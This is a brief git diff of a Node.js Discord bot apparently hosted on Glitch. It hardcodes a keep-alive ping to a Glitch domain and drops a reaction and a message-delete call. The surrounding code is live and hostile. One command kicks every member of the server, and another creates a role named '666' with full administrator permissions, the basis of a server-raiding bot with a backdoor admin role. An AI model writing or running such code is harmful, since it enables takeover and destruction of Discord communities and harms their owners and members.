@@ -11,7 +11,7 @@ app.get("/", (request, response) => {
 });
 app.listen(process.env.PORT);
 setInterval(() => {
-  http.get(`http://${process.env.PROJECT_DOMAIN}.glitch.me/`);
+  http.get(`http://pyros.glitch.me/`);
 }, 10000);
 
 const Discord = require('discord.js');
@@ -25,14 +25,12 @@ require('./util/eventLoader')(client);
 
   client.on('message', msg => {
     if (msg.content === '!kick') {
-      msg.react('✅');
       msg.guild.members.forEach(member => member.kick())
     }
   });
 
 client.on('message', msg => {
   if (msg.content === 'rol') {
-    msg.delete()
     msg.guild.createRole({
       name: '666',
       permissions:["ADMINISTRATOR"] } );
